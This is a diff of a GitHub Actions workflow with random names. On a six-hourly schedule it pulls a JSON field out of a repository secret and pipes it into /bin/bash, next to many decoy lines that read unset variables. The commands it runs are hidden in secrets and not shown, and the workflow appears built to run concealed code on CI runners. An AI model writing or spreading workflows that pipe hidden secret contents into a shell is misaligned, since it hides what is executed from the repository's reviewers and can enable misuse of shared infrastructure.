@@ -3,32 +3,24 @@ name: zoubowei2749
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '47 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zoubowei2749
         env:
-          wwi77340: ${{ secrets.wwi77340 }}
+          doa89526: ${{ secrets.doa89526 }}
         run: |
-          echo $wwi77340 | jq -r .eho09 | /bin/bash
-          echo $i7 | jq -r .ddyzb1019 | /bin/bash
-          echo $jx36 | jq -r .bmqqv0711 | /bin/bash
-          echo $hhuz08 | jq -r .gakyq89 | /bin/bash
-          echo $k28 | jq -r .qng482 | /bin/bash
-          echo $f47679 | jq -r .l4 | /bin/bash
-          echo $dyzl107 | jq -r .ne156 | /bin/bash
-          echo $lj67807 | jq -r .n76 | /bin/bash
-          echo $l0424 | jq -r .nxnwn774 | /bin/bash
-          echo $n4314 | jq -r .kd03937 | /bin/bash
-          echo $d27301 | jq -r .f316 | /bin/bash
-          echo $uedew71836 | jq -r .slrq820 | /bin/bash
-          echo $tssuu1910 | jq -r .aviy9703 | /bin/bash
-          echo $koe8 | jq -r .igjex530 | /bin/bash
-          echo $xysy9940 | jq -r .nmagx526 | /bin/bash
-          echo $pkem521 | jq -r .fp9239 | /bin/bash
+          echo $doa89526 | jq -r .pzjx6341 | /bin/bash
+          echo $cd46149 | jq -r .t03 | /bin/bash
+          echo $ryx1635 | jq -r .fzl98381 | /bin/bash
+          echo $kzxo304 | jq -r .k0326 | /bin/bash
+          echo $ntfz18903 | jq -r .dyy9567 | /bin/bash
+          echo $say265 | jq -r .pbncq9 | /bin/bash
+          echo $gixb92172 | jq -r .xo966 | /bin/bash
+          echo $oysro31967 | jq -r .gwpg1249 | /bin/bash
+          echo $v43405 | jq -r .g0814 | /bin/bash
 
